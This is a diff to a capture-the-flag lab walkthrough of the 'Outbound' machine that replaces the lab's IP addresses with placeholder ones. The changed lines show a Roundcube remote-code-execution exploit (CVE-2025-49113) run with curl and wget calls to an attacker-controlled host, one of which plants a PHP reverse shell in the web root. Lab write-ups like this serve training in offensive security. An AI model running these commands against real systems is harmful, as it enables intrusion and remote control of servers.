@@ -18,7 +18,7 @@ Outbound is a Linux machine featuring a Roundcube webmail application vulnerable
 We start with a standard nmap scan:
 
 ```bash
-nmap -sV -v 10.129.243.86
+nmap -sV -v 10.100.100.100
 ```
 
 Results:
@@ -40,7 +40,7 @@ http://mail.outbound.htb/
 We add this to our hosts file:
 
 ```bash
-echo "10.129.243.86 mail.outbound.htb" | sudo tee -a /etc/hosts
+echo "10.100.100.100 mail.outbound.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Subdomain Enumeration
@@ -128,13 +128,13 @@ We test if the exploit works by making the target reach out to our server:
 python3 -m http.server 8000
 
 # Terminal 2: Run exploit
-php CVE-2025-49113.php http://mail.outbound.htb/ tyler [REDACTED] 'curl http://10.10.15.79:8000/$(whoami)'
+php CVE-2025-49113.php http://mail.outbound.htb/ tyler [REDACTED] 'curl http://10.10.10.10:8000/$(whoami)'
 ```
 
 We receive a connection confirming RCE:
 
 ```
-10.129.236.232 - - [03/Oct/2025 19:04:48] "GET /www-data HTTP/1.1" 404 -
+10.100.100.100 - - [03/Oct/2025 19:04:48] "GET /www-data HTTP/1.1" 404 -
 ```
 
 Success! We're executing commands as `www-data`.
@@ -145,7 +145,7 @@ We upload a PHP reverse shell:
 
 ```bash
 php CVE-2025-49113.php http://mail.outbound.htb/ tyler [REDACTED] \
-  'wget -O /var/www/html/roundcube/public_html/shell.php http://10.10.15.79:8000/shell.php'
+  'wget -O /var/www/html/roundcube/public_html/shell.php http://10.10.10.10:8000/shell.php'
 ```
 
 Then access the shell via the browser to trigger it, and we get a reverse shell as `www-data`.
@@ -333,7 +333,7 @@ The mention of "main server" confirms we're in a Docker container, and there's a
 We use jacob's credentials from the email to SSH to the host:
 
 ```bash
-ssh jacob@10.129.99.99
+ssh jacob@10.100.100.100
 # Password: [REDACTED]
 ```
 
